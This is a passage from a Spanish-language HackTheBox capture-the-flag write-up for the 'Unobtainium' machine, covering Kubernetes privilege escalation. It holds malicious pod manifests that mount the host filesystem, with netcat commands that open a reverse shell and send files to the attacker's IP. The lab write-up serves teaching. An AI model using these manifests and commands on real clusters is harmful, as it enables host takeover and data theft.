+Volumes:
+  default-token-l85f2:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-l85f2
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &lt;none&gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:
+  Type     Reason   Age                    From     Message
+  ----     ------   ----                   ----     -------
+  Warning  BackOff  4m4s (x532 over 118m)  kubelet  Back-off restarting failed container
+</code></pre>
+
+<p>Entre algunos cambios que hice, el que me dio resultado fue el campo <code>Image</code>, el cual vemos que es distinto al de nuestro archivo <code>.yaml</code>:</p>
+
+<blockquote>
+  <p>Además vemos que ese <strong>pod</strong> en concreto se comunica con el sistema host <code>unobtainium/10.10.10.235</code>, eso también me llamo a atención…</p>
+</blockquote>
+
+<p><strong>aaa.yaml</strong>:</p>
+
+<pre><code class="language-yaml">image: busybox:1.29.2
+</code></pre>
+
+<p><strong>backup-pod</strong>:</p>
+
+<pre><code class="language-yaml">image: localhost:5000/dev-alpine
+</code></pre>
+
+<p>Puede ser que nos esté generando error por eso, ya que la imagen <code>busybox:1.29.2</code> lo más probable es que no exista y por el contrario <code>localhost:5000/dev-alpine</code> si, pues copiemos esa imagen en nuestro <strong>pod</strong> e intentemos crearlo de nuevo:</p>
+
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+spec:
+  containers:
+  - name: busybox
+    image: localhost:5000/dev-alpine
+    command: ["/bin/sh"]
+    args: ["-c", "id | nc 10.10.14.146 4435"]
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+</code></pre>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
+</code></pre>
+
+<p>Yyyy en nuestro listenerrrrrr:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_nc_id.png" alt="338bash_maliciousPOD_nc_id" /></p>
+
+<p>Peeeeeeeerfecto, tenemos ejecución remota de comandos, pues entablémonos una reverse Shell:</p>
+
+<pre><code class="language-bash">apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+spec:
+  containers:
+  - name: busybox
+    image: localhost:5000/dev-alpine
+    command: ["/bin/sh"]
+    args: ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.146 4435 &gt;/tmp/f"]
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
+</code></pre>
+
+<p>Y ahora en nuestro listener:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_revsh.png" alt="338bash_maliciousPOD_revsh" /></p>
+
+<p>Pero la perdemos muy rápido (a la vez que se borra el <strong>pod</strong>), pero podemos aprovecharnos de la carpeta <code>/host</code> que crea el <strong>pod</strong> para leer la flag:</p>
+
+<p>(Podemos obtener una Shell constante de varias formas, ya es cuestión de su imaginación)</p>
+
+<pre><code class="language-yaml">...
+    args: ["-c", "cat /host/root/root.txt | nc 10.10.14.146 4435"]
+...
+</code></pre>
+
+<p>Recibimos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_root.png" alt="338flags_root" /></p>
+
+<p>Intente algunas formas de conseguir una <strong>Shell</strong> sin que se nos cierre pero no lo logre :(</p>
+
+<p>Veamos la flag de <code>user.txt</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_user.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Vaya locura de máquina, me encanto la explotación inicial, el juntar las dos vulnerabilidades para obtener un solo resultado, increíble, muy lindo :3 La parte de <strong>Kubernetes</strong> fue una locura, mucho movimiento lateral.</p>
+
+<p>Bonita y entretenida máquina, aprendimos bastante y reforzamos cositas que sabíamos…</p>
+
+<p>Bueno, no siendo más, muchas gracias por siempre aguantar :* Nos leeremos después yyyyy A SEGUIR ROMPIENDO TODOOOOOOOOOOOOO!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Unobtainium&url=http://localhost:4000/htb/unobtainium" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#code-analysis">code-analysis</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#google-cloudstorage-commands">google-cloudstorage-commands</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kubernetes">kubernetes</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#lodash">lodash</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#node.js">node.js</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#pivoting">pivoting</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/tenet">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/tenet">HackTheBox - Tenet</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos deserialización insegura de objetos en PHP, reutilización de contraseñas y encontraremos pequeños fallos en scripts de bash :P
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">12 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/scriptkiddie">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png" alt="HackTheBox - ScriptKiddie"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/scriptkiddie">HackTheBox - ScriptKiddie</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un “template”, ¿qué puede salir mal? Inspeccionaremos un script al detalle...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">05 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/enterprise">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" alt="HackTheBox - Enterprise"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/enterprise">HackTheBox - Enterprise</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
